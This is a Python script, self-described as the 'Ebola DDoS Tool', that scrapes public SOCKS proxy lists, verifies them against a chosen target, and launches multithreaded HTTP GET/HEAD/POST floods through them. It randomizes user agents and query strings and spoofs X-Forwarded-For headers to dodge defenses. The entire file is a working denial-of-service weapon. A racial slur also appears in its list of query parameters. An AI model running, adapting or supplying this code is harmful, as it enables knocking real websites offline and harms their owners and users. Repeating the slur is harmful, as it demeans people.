import socket, threading, sys, os, random, time, zipfile
try:
    import requests, socks, folium, IP2Location
    from colorama import Fore
except:
    try:
        os.system(
            "pip3 install requests colorama pysocks"
        )
        os.system(
            "pip3 install folium"
        )
        os.system(
            "pip3 install IP2Location"
        )
    except:
        os.system(
            "py -m pip install requests colorama pysocks"
        )
        os.system(
            "py -m pip install folium"
        )
        os.system(
            "py -m pip install IP2Location"
        )

def clone_socks():
    f = open("socks5.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
        f.write(r.content)
    except:
        pass
    try:
        r = request.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
        f.write(r.content)
        f.close()
    except:
        f.close()
    g = open("socks4.txt","wb")
    try:
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=10000&country=all",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
        g.write(r.content)
    except:
        pass
    try:
        r = request.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
        g.write(r.content)
        g.close()
    except:
        g.close() 

new_host = ""
useragents = []
string = ["id","q","a","s","page","result","search","login","user","nigga","ebola","hiv","covid","h1n1","language","data"]

nums = 0
suc = 0

print('\33]0;[%s] EbolaVirus\a'%(suc),end='')
os.system("clear")

print("""
      ▓█████  ▄▄▄▄    ▒█████   ██▓    ▄▄▄    Ebola DDoS Tool Code By 413xPr06605.
3     ▓█   ▀ ▓█████▄ ▒██▒  ██▒▓██▒   ▒████▄          Windows/Linux Supported Ver.
 1    ▒███   ▒██▒ ▄██▒██░  ██▒▒██░   ▒██  ▀█▄                 Socks4/5 Supported.
8 4   ▒▓█  ▄ ▒██░█▀  ▒██   ██░▒██░   ░██▄▄▄▄██                 Version ~ # 1.3.0,
 2    ░▒████▒░▓█  ▀█▓░ ████▓▒░░██████▒▓█   ▓██▒ 
  3   ░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░▓  ░▒▒   ▓▒█░ [+] Add Brute Mode               
      ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░ ░ ▒  ░ ▒   ▒▒ ░  [+] Threads Optimization   
         ░    ░    ░ ░ ░ ░ ▒    ░ ░    ░   ▒    [+] Request Package Optimization,
        ░  ░ ░      ░   ░ ░      ░  ░     ░  ░                                   
                    ░                           \n""")

socks_version = str(input("Socks Version (4/5) : "))
if socks_version =="4":
    ipfile = "socks4.txt"
else:
    ipfile = "socks5.txt"
if socks_version =="4" or socks_version =="5":
    pass
else:
    print("Only Accept 4 or 5\nGo Fuck Yourself Skid !")
    sys.exit()

clone_socks()

print("\nCheck File Response => IP2LOCATION-LITE-DB5.BIN")

def check_all_ip_x_y(database,ip_list):
    info = {}
    for ip in ip_list:
        ip = ip.strip().split(":")
        info[ip[0]] = [database.get_latitude(ip[0]),database.get_longitude(ip[0])]

    return info

def setup():
    f = open(ipfile,"r")
    ip_list = f.readlines()
    f.close()
    database = IP2Location.IP2Location(os.path.join("IP2LOCATION-LITE-DB5.BIN"))
    info = check_all_ip_x_y(database,ip_list)
    world_map = folium.Map([0.000000,0.000000],zoom_start=3)
    for ip in info:
        world_map.add_child(
            folium.CircleMarker(
                [info[ip][0], info[ip][1]],
                radius=4,
                color='red',
                fill=True,
                fill_color='white',
                fill_opacity=0.6
            )
        )
    #world_map.render()
    world_map.save("ebola.html")

try:
    setup()
    print("Ebola Virus Map Sucess Created as \"ebola.html\"\n")
except:
    print("\n - - - Waiting For Git Response - - - \n")
    r = requests.get("https://github.com/Free-The-C0d3/Free-The-C0d3.github.io/raw/master/IP2LOCATION-LITE-DB5.zip")
    with open("IP2LOCATION-LITE-DB5.zip","wb") as f:
        f.write(r.content)
    with zipfile.ZipFile("IP2LOCATION-LITE-DB5.zip","r") as myzip:
        myzip.extract("IP2LOCATION-LITE-DB5.BIN")
    print("File Save as \"IP2LOCATION-LITE-DB5.BIN\"\n")
    maplist = str(input("Create Ebola Virus Map (y/n) : "))
    if maplist =="y" or maplist =="" or maplist =="Y":
        setup()
        print("Ebola Virus Map Sucess Created as \"ebola.html\"\n")
    else:
        pass

def GenUA():
    AW = str(random.randint(500,599))+".36"
    BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
    OPR = str(random.randint(30,70))+".0."+str(random.randint(1000,4000))+"."+str(random.randint(1,1000))
    UCB = str(random.randint(5,12))+"."+str(random.randint(5,12))+"."+str(random.randint(0,10))+"."+str(random.randint(1,1000))
    devices = random.choice(
        [
            "IOS",
            "Windows",
            "X11",
            "Android",
            "Symbian",
            "Macintosh"
        ]
    )
    if devices =="Windows":
        version = random.choice(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
            ]
        )
    elif devices =="IOS":
        version = random.choice(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ]
        )
    elif devices =="X11":
        version = random.choice(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ]
        )
    elif devices =="Android":
        version = random.choice(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ]
        )
    elif devices =="Macintosh":
        version = random.choice(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ]
        )
    elif devices =="Symbian":
        version = random.choice(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ]
        )
    borwser = random.choice(["chrome","uc","op"])
    if borwser =="chrome":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW
    elif borwser =="op":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW +" OPR/" + OPR
    elif borwser =="uc":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW

def flood(attack_type,host,port,path,x,brute,eve):
    if x < len(proxies):
        proxy = proxies[x].strip().split(":")
    else:
        proxy = random.choice(proxies).strip().split(":")
    useragent = useragents[x] + "\r\n"
    connection = "Connection: Keep-Alive:823\r\n"
    accept = "Accept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\n"
    referer = "Referer: http://netsec-reborn.onion/ebola-virus?id="+host+"\r\n"
    fake_addr = "X-Forwarded-For: 1.0.0.1, "+proxy[0]+", 1.1.1.1\r\n"
    origin = "Origin: http://free-the-code.onion/ebola?virus=NS:Reborn-DDoS-Team" + "\r\n"
    if attack_type =="POST":
        content = "X-Requested-With: XMLHttpRequest\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\n"
        length = "Content-Length: 16\r\n\nEbola-Virus-DDoS\r\n\r\n"
    else:
        content = "\r"
        length = "\n"
    eve.wait()
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            if socks_version =="5":
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            else:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.connect_ex((str(host), int(port)))
            try:
                for _ in range(100):
                    http = attack_type+" "+path+"?"+random.choice(string)+"="+str(random.randint(880906,19990906))
                    http2 = "&"+random.choice(string)+"?="+str(random.randint(880906,19990906))+" HTTP/1.1\r\nHost: "+host+"\r\n"
                    if attack_type == "POST":
                        http = attack_type + " / HTTP/1.1\r\nHost: " + host + "\r\n"
                    request = http + http2 + useragent + connection + accept + referer + origin + fake_addr + content + length
                    if brute =="ON":
                        request = http + http2 + connection + content + length
                    s.send(
                        str(request).encode()
                    )
                    s.send(
                        str(request).encode()
                    )
                s.close()
                print("[%s:%s] %s Request -> %s"%(proxy[0],proxy[1],attack_type,host))
            except:
                s.close()
                proxy = random.choice(proxies).strip().split(":")
        except:
            s.close()
            proxy = random.choice(proxies).strip().split(":")   

def checking_socks(lines,):
    global nums
    global suc
    try:
        proxy = lines.strip().split(":")
        if socks_version =="5":
            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]), 1)
        else:
            socks.setdefaultproxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]), 1)
    except:
        proxies.remove(lines)
        sys.stdout.write(Fore.BLUE+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(proxy[0])+Fore.CYAN+"]-["+Fore.RED+"Disconnected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
        return
    err = 0
    while 1:
        if err == 3:
            proxies.remove(lines)
            sys.stdout.write(Fore.BLUE+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(proxy[0])+Fore.CYAN+"]-["+Fore.RED+"Disconnected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
            break
        try:
            s = socks.socksocket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
            s.settimeout(5)
            s.connect((str(host), int(port)))
            s.send(str.encode("GET / HTTP/1.1\r\nHost: "+host+"\r\n\r\n"))
            s.close()
            suc +=1
            print('\33]0;[%s] EbolaVirus - Join\a'%(suc),end='')
            sys.stdout.write(Fore.BLUE+"Checking "+Fore.CYAN+"["+Fore.WHITE+str(proxy[0])+Fore.CYAN+"]-["+Fore.GREEN+"Connected"+Fore.CYAN+"] \n"+Fore.YELLOW+"Number "+Fore.CYAN+"["+Fore.WHITE+str(nums)+Fore.CYAN+"] \r"+Fore.RESET)
            break
        except:
            s.close()
            err +=1
    nums += 1

def check_socks():
    global nums
    global suc
    thread_list=[]
    for lines in list(proxies):
        th = threading.Thread(
            target=checking_socks,
            args=(
                lines,
            )
        )
        th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.flush()
    with open(ipfile, 'wb') as fp:
        for lines in list(proxies):
            fp.write(
                bytes(
                    lines,
                    encoding='utf8'
                )
            )
    fp.close()

def main():
    global proxies
    global host
    global port
    global socks_version
    attack_type = str(input("Choose (GET / HEAD / POST) : "))
    if attack_type =="GET" or attack_type =="HEAD" or attack_type =="POST":
        pass
    elif attack_type =="Get" or attack_type =="get":
        attack_type = "GET"
        pass
    elif attack_type =="Head" or attack_type =="head":
        attack_type = "HEAD"
        pass
    elif attack_type =="Post" or attack_type =="post":
        attack_type = "POST"
        pass
    else:
        print("Wrong Input , Go Fuck Yourself Skid !")
        sys.exit()
    host = str(input("Target [Host/Ip] : "))
    if host =="":
        print("Loss Value -> host\nGo Fuck Yourself Skid !")
        sys.exit()
    else:
        new_host = ""
        if "http://" in host:
            for _ in range((len(host)-7)):
                new_host = new_host + host[(_+7)]
            host = new_host
        elif "https://" in host:
            for _ in range((len(host)-8)):
                new_host = new_host + host[(_+8)]
            host = new_host
        else:
            pass
        if "192.168" in host or "127.0.0.1" in host or "localhost" in host:
            print("Invalid Host/Ip\nDamn Noob")
            sys.exit()
        if "gov" in host or "edu" in host:
            print("Don't Attack Any Gov Or Edu Site\nGo Fuck Yourself Noob Skid")
            sys.exit()
    port = str(input("Port [80/443] : "))
    if port =="":
        print("Set Default Port -> 80")
        port = 80
    else:
        port = int(port)
    path = str(input("Web Path (/) : "))
    if path =="":
        print("Set Default Path -> /")
        path = "/"
    else:
        path = path
        pass
    proxyfile = str(input("Proxy Filename (socks5.txt) : "))
    if proxyfile =="":
        if socks_version =="5":
            proxyfile = "socks5.txt"
        else:
            proxyfile = "socks4.txt"
    proxies = open(proxyfile).readlines()
    check = str(input("Check Socks Or Not (y/n) : "))
    if check =="y" or check == "Y" or check =="":
        print("Waiting Ebola Virus Join Attack . . .")
        time.sleep(1)
        check_socks()
        print('\33]0;[%s] EbolaVirus - Standby\a'%(suc),end='')
    elif check =="n" or check =="N":
        pass
    brute = str(input("Brute Mode (on/off) : "))
    if brute == "" or brute =="On" or brute =="on":
        brute = "ON"
    else:
        pass
    thr = str(input("Threads [1-1000] : "))
    if thr =="":
        print("Set Default Threads -> 300")
        thr = 300
    else:
        thr = int(thr)
    print("User-Agent Creating . . .")
    for _ in range(thr):
        user_agent = GenUA()
        useragents.append(user_agent)
    eve = threading.Event()
    time.sleep(1)
    for x in range(thr):
        th = threading.Thread(
            target=flood,
            args=(
                attack_type,
                host,
                port,
                path,
                x,
                brute,
                eve,
            )
        )
        th.start()
    input("Press Enter To Start Attack ")
    eve.set()

if __name__ == "__main__":
    main()